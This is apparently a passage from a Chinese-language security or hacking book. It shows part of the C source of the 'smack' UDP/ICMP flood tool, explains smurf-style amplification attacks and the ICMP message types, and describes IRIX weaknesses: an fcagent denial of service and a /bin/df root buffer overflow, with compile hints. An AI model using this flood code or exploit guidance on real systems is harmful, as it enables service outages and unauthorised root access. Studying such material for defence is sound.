
```c
iph->ip_p = IPPROTO_UDP;
iph->ip_src = src;
dst.s_addr = inet_addr(ip);
if (dst.s_addr == -1) {
    printf("Invalid destination IP: %s\n", ip);
}
addr.sin_port = htons(port);
addr.sin_addr.s_addr = dst.s_addr;
iph->ip_dst = dst;
#ifdef BSD
    udp->uh_dport = htons(dp);
    if (mode == 0) {
        udp->uh_ulen = htons(sizeof *udp + 12);
        udp->uh_sport = htons(rand());
    }
    else {
        udp->uh_ulen = htons(sizeof *udp + strlen(conn_pack1));
        udp->uh_sport = htons(27001);
    }
#else
    udp->dest = htons(dp);
    if (mode == 0) {
        udp->len = htons(sizeof *udp + 12);
        udp->source = htons(rand());
    }
    else {
        udp->len = htons(sizeof *udp + strlen(conn_pack1));
        udp->source = htons(27001);
    }
#endif
    if (mode == 0) {
        memcpy(udp + 1, conn_pack0, 12);
        ret = sendto(s, pack, P50, 0, (struct sockaddr *)&addr, sizeof(addr));
    }
    else {
        memcpy(udp + 1, conn_pack1, strlen(conn_pack1));
        ret = sendto(s, pack, P51, 0, (struct sockaddr *)&addr, sizeof(addr));
        if (ret == -1) {
            perror("sendto");
            exit(-1);
        }
    }
```

为了全面识别 `smack.c` 的威胁级别，有必要进一步检查其功能。本书前文曾描述过洪水攻击技术，例如臭名昭著的 smurf 攻击。简而言之，smurf 攻击是指攻击者伪造 ICMP 回显报文（带有目标地址）的源字段，并将其发送到广播地址。其结果通常是灾难性的，因为目标会从本地网段上的各种接口接收到回复。

互联网控制报文协议（ICMP）发送消息数据包，将错误和其他相关信息发回发送站或源主机。主机和基础设施设备通过此机制来通信与控制信息和错误信息有关，这些信息涉及 IP 数据报处理。ICMP 消息封装是一个双重过程：消息被封装在 IP 数据报中，而这些数据报又被封装在帧中，从而穿越互联网。基本上，ICMP 使用与数据报相同的不可靠通信方式。因此，ICMP 错误消息可能会丢失或被重复。表 10.1 列出并描述了各种 ICMP 消息类型。

对于类型 3（目标不可达），存在若干发出此类消息类型的情形，包括：当路由器或网关不知道如何到达目标时；当某个协议或应用程序未激活时；当数据报指定了不稳定的路由时；或者当路由器必须对数据报进行分片但无法做到（因为设置了 *Don’t Fragment* 标志）时。类型 3 消息的一个示例可能如下：

## 表 10.1 ICMP 消息类型

| 消息类型 | 描述 |
| :--- | :--- |
| 0 | 回显应答 |
| 3 | 目标不可达 |
| 4 | 源站抑制 |
| 5 | 路由重定向 |
| 8 | 回显请求 |
| 11 | 数据报超时 |
| 12 | 数据报参数问题 |
| 13 | 时间戳请求 |
| 14 | 时间戳应答 |
| 15 | 信息请求 |
| 16 | 信息应答 |
| 17 | 地址掩码请求 |
| 18 | 地址掩码应答 |

步骤 1：开始回显请求

```
Ping 206.0.125.81 (at the command prompt)
```

步骤 2：开始回显应答

```
Pinging 206.0.125.81 with 32 bytes of data:
Destination host unreachable.
Destination host unreachable.
Destination host unreachable.
```

广播地址被定义为将单个数据包复制并发送到网络上所有地址的系统。通过向称为广播地址的公共地址发送数据包，可以通知连接到网络的所有主机。根据被“smurf”子网的大小，受害者接收到的回复数量可能多达数千。此外，对攻击者来说，另一个好处是该网段将遭受严重的拥塞。

所谓的 smack 攻击继承了与 smurf 相似的功能，只是受害者接收到的是来自随机指定地址的响应。这些地址输入在 `$smack.c` 中的以下代码行之间：

```c
/* Insert addresses here
"xxx.xxx.xxx.xxx:26000:0",
"xxx.xxx.xxx.xxx:26000:0",
"xxx.xxx.xxx.xxx:26000:0", 
End */ 
```

对于受害者来说，结果表现为随机 ICMP 类型 3 消息的洪水，如图 10.3 所示。

![](img/ba85bb40c695c02adae8cbd6666f2e0c_542_0.png)

**图 10.3** ICMP 类型 3 消息洪水。

## IRIX

1982 年，Silicon Graphics, Inc. (SGI) 发布了一种名为 IRIX（www.sgi.com/developers/technology/irix）的新型行业标准的 UNIX 变体。多年来，IRIX 使 SGI 能够提供多代领先的高性能计算、先进图形和可视计算平台。IRIX 是第一个支持对称多处理（SMP）以及完整的 64 位和 32 位环境的商用 UNIX 操作系统。IRIX 符合 UNIX 系统 V（第四版）以及 Open Group 的许多标准，包括 UNIX 95、2000 年问题（Y2K）和 POSIX。现在，借助用户友好的弹出式图形 GUI 窗口，IRIX 的安装、配置、管理和许可变得轻而易举。

例如，许可管理器（如图 10.4 所示）是一个图形工具，可以从系统工具箱中访问。每当用户安装、更新或删除许可时，许可管理器都会重新启动或停止本地的许可管理器守护进程，以使用户的更改生效。

![](img/ba85bb40c695c02adae8cbd6666f2e0c_542_1.png)

**图 10.4** IRIX 许可管理器。

### 弱点

#### 拒绝服务攻击

**概要：** 通过向 `fcagent` 守护进程发送特定的 RPC 数据包，可以使 FibreVault 配置和状态监控器无法工作。

**漏洞状态：** 系统崩溃。

**易受攻击版本：** IRIX 6.4, 6.5。

**利用方式：** IRIX 的 `fcagent` 守护进程是一个基于 RPC 的守护进程，它服务于关于 FibreVault 机箱（一种非常快速的光纤磁盘安装设备）的状态或配置请求。`Fcagent` 容易受到远程拒绝服务（DoS）攻击，这可能导致 FibreVault 停止响应，从而使 IRIX 的磁盘阵列无法访问。通过向 `fcagent` 守护进程发送特定的 RPC 数据包，可以使 FibreVault 配置和状态监控器无法工作。这会导致 FibreVault 内部的所有磁盘停止响应，可能导致系统停止。

#### 根访问权限

**概要：** `/bin/df`（以 suid root 安装）中存在缓冲区溢出，因此黑客可以获得根访问权限。

**漏洞状态：** 未授权的根访问。

**易受攻击版本：** IRIX 5.3, 6.2 和 6.3。

**利用方式：** 使用 `gcc` 或 `cc` 编译，并在 O2 上指定 `-mips3`、`-mips4` 或 `-n32`。默认编译选项会导致生成引起缓存一致性问题的二进制文件。

`buffer.c`
